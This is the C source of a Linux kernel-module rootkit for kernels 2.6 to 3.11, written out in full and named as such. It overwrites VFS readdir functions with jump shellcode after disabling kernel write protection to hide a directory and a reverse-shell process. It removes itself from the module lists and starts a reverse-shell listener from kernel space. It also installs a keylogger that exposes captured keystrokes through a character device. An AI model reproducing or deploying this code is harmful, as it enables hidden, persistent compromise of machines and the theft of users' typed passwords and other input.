#include "rootkit.h"

/***
written by Mark Laubender
rootkit for 2.6 < kernel version < 3.11
***/


/*
defining shellcode, code size, and offsets for x86 and x86_64.  the shellcode will overwrite the VFS 
function prologue, jump it to our new code, then return control back to the original function
*/
#if defined(__i386__) //x86
#define code_size 6 /* code size */
#define shell_code "\x68\x00\x00\x00\x00\xc3" /* push addr; ret */
#define poff 1 /* offset to start writing address */
#else //x86_64
#define code_size 12 /* code size */
#define shell_code "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0" /* mov rax,[addr]; jmp rax */
#define poff 2 /* offset to start writing address */
#endif 

#define SHELL "shell_path"
#define REV_SHELL_PROC_NAME "reverse_shell" 	//process name must be the real name given at compile time (-o output), 
						//not the one we change it to in reverse_shell.c


MODULE_LICENSE("GPL");
static int rootkit_init(void);
static void rootkit_exit(void);
module_init(rootkit_init);
module_exit(rootkit_exit);

/*	we're hijacking the VFS readdir function to hide directories and processes.
	
	readdir(file, userbuff, filldir)
	
	filldir (a filldir_t structure) does the actual filling of the userland buffer, so in 
	order to hide a directory all we need to do is create our own filldir and pass it into 
	the original readdir function, filter out the directory or process we want hidden, then return control
	back to the original filldir function
*/
static int (*orig_root_readdir)(struct file *file, void *dirent, filldir_t filldir);
static int (*orig_proc_readdir)(struct file *file, void *dirent, filldir_t filldir); 
static int (*orig_proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type);
static int (*orig_root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type);


struct hook {
	void *target; /* target pointer */
	unsigned char new_code[code_size]; /* hijacked function jmp */
	unsigned char orig_code[code_size]; /* original function sys_call */
	struct list_head list; /* linked list for proc and root readdir/iterator */
};

//start linked list
LIST_HEAD(hooked_targets);

//populate orig_root_readdir and orig_proc_readdir pointers
void* get_readdir(const char* path) {
	void* ret;
	struct file* file;

	//error handling failed file open
	if ((file = filp_open(path, O_RDONLY, 0)) == NULL)
		return NULL;

	ret = file->f_op->readdir; //return correct readdir pointer
	filp_close(file,0);
	printk("%p\n", ret);
	
	return ret;
}

//these root functions will hide the directory from the user
static int new_root_filldir(void* __buff, const char* name, int namelen, loff_t offset, u64 ino, unsigned int d_type) {
	char* protected = "rootkit";
	
	//if the current directory contains the name of the protected directory, don't fill the 
	//buffer with that directory
	if (!strcmp(name, protected))
		return 0;
	return orig_root_filldir(__buff, name, namelen, offset, ino, d_type);
}

//the new readdir function
int new_root_readdir(struct file *file, void* dirent, filldir_t filldir) {
	int ret;
	orig_root_filldir = filldir;

	//once the new code is executed we want the original code to be executed after
	//the current code is overwritten with the shellcode and won't work, we need to change it back to the original before it will work
	pause_hook(orig_root_readdir);
	ret = orig_root_readdir(file, dirent, &new_root_filldir); //call readdir with the new filldir
	resume_hook(orig_root_readdir); //re-hook the function with the shellcode

	return ret; //return original function
}

//these proc functions will hide processes from the user
static int new_proc_filldir(void* __buff, const char* name, int namelen, loff_t offset, u64 ino, unsigned int d_type) {
	long pid;
	char* endp;
	long my_pid =  get_my_pid();
	unsigned short base = 10;
	pid = simple_strtol(name, &endp, base);
	
	if (my_pid == pid) //if pid equals my_pid, don't fill directory
		return 0;
	return orig_proc_filldir(__buff, name, namelen, offset, ino, d_type);
}

int new_proc_readdir(struct file *file, void *dirent, filldir_t filldir) {
	int ret;
	orig_proc_filldir = filldir;

	pause_hook(orig_proc_readdir);	
	ret = orig_proc_readdir(file, dirent, &new_proc_filldir); //this is the original function with the new proc_filldir passed into it
	resume_hook(orig_proc_readdir); //re-hook the function

	return ret;
}

//add the prologue of the VFS function, as well as the shellcode we will overwrite it with, into 
//a linked list structure.  This makes it easy to swap the code back in and out.
void add_to_list(void* target, unsigned char new_code[], unsigned char orig_code[]) {
	struct hook *h;
	h = kmalloc(sizeof(*h), GFP_KERNEL);

	h->target = target;
	memcpy(h->new_code, new_code, code_size);
	memcpy(h->orig_code, orig_code, code_size);
	list_add(&h->list, &hooked_targets);
}


//save the shellcode and prologue code into a linked list, then overwrite the prologue with the shellcode
void start_hook(void* target, void* new) {
	
	unsigned char new_code[code_size];
	unsigned char orig_code[code_size];

	memcpy(new_code,shell_code,code_size);
	*(unsigned long*)&new_code[poff] = (unsigned long)new; //set new_code equal to the new code
	memcpy(orig_code,target,code_size);

	add_to_list(target, new_code, orig_code);
	resume_hook(target);
}

//overwrites the VFS function prologue with the shellcode
void resume_hook(void* target) {
	struct hook *h;

	//cycle through list to find the correct system call
	list_for_each_entry(h, &hooked_targets, list) {
		if (target == h->target) {
			disable_wp();
			memcpy(target, h->new_code, code_size); //copy into target function the new code
			enable_wp();
		}
	}
}

//overwrites the VFS function prologue with the original code
void pause_hook(void* target) {
	struct hook *h;

	list_for_each_entry(h, &hooked_targets, list) {
		if (target == h->target) {
			preempt_disable();
			barrier();
			
			disable_wp();
			memcpy(target, h->orig_code, code_size);
			enable_wp();

			barrier();
			preempt_enable_no_resched();		
		}
	}
}

int keylog_open(struct inode *inode, struct file *filp) {

	printk(KERN_DEBUG "[Keylogger]: Opening device\n");
	return 0;
}

ssize_t read_keystroke(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) { 

	char* p = buffer;
	int bytes = 0;

	//get to the end of the buffer
	while(*p != '\0') {
		bytes++;
		p++;
	}

	if(bytes == 0 || *f_pos) return 0;

	int ret = copy_to_user(buf, buffer, bytes);

	if(ret) {
		printk("[Keylogger]: Can't copy to user space buffer\n");
		return -EFAULT;
	}

	*f_pos = 1;

	return bytes;
}

int keyboard_notifier(struct notifier_block* nblock, unsigned long code, void* _param) {
	struct keyboard_notifier_param *param = _param;

	if(code == KBD_KEYCODE && param->down) {
		if(param-> value == KEY_BACKSPACE) {
			if(bptr != buffer) {
				--bptr;
				*bptr = '\0';
			}
		}
		else {
			char ch = get_ascii(param->value);
			
			if(ch != 'X') {
				*bptr = ch;
				bptr++;
			
				if(bptr == endptr) 
					bptr = buffer;
			}
		}
	}

	return NOTIFY_OK;
}

//function to start execution from kernel-land for the userland icmp_message function from reverse_shell 
static int start_listener(char* path){
	char *argv[] = {path, NULL, NULL};
	static char *env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

//return dynamically assigned pid of PROC_NAME
long get_my_pid(void) {
	struct task_struct *task;

	for_each_process(task) {
		if ((strcmp(task->comm, REV_SHELL_PROC_NAME) == 0)) { //if process equals process name, return pid
			return task->pid;
		} 
	}
	return -1;
}

void disable_wp(void) {
	preempt_disable(); //disable kernel preemption, we don't want a process to use the function while we are altering it 
	barrier(); //barrier
	write_cr0(read_cr0() & (~0x10000));
}

void enable_wp(void) {
	write_cr0(read_cr0() | 0x10000);
	barrier();
	preempt_enable_no_resched(); //re-enable kernel preemption
}

static int rootkit_init(void) {	
	list_del_init(&__this_module.list); //hide module from /proc/modules
	kobject_del(&THIS_MODULE->mkobj.kobj); //hide module from /sys/module

	printk("rootkit: root_readdir found at ");
	orig_root_readdir = get_readdir("/"); //root readdir to hide all files and directories		
	start_hook(orig_root_readdir, new_root_readdir);

	printk("rootkit: proc_readdir found at ");
	orig_proc_readdir = get_readdir("/proc"); //proc readdir to hide processes
	start_hook(orig_proc_readdir, new_proc_readdir);
	
	start_listener(SHELL); //start reverse shell listener
	
	//initialize kernel space keylogger
	int result = register_chrdev(KEYLOG_MAJOR, "rooted", &keylog_fops);
	if (result < 0)
		return result;
	register_keyboard_notifier(&nb);
	memset(buffer, 0, sizeof buffer);


	printk("rootkit: module loaded\n");

	return 0;
}

static void rootkit_exit(void) {
	pause_hook(orig_root_readdir);
	pause_hook(orig_proc_readdir);

	/* Freeing the major number */
	unregister_chrdev(KEYLOG_MAJOR, "rooted");

	unregister_keyboard_notifier(&nb);
	memset(buffer, 0, sizeof buffer);
	bptr = buffer;	

	//kill_listener();
	printk("rootkit: module removed\n");
}
